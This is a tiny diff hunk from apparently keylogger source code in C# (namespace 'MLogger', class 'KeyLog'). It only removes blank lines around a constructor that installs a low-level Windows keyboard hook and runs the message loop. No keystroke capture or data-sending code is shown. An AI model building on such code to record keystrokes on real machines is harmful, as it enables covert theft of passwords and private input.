@@ -20,12 +20,9 @@ namespace MLogger
 
         public KeyLog()
         {
-
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
-
-
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
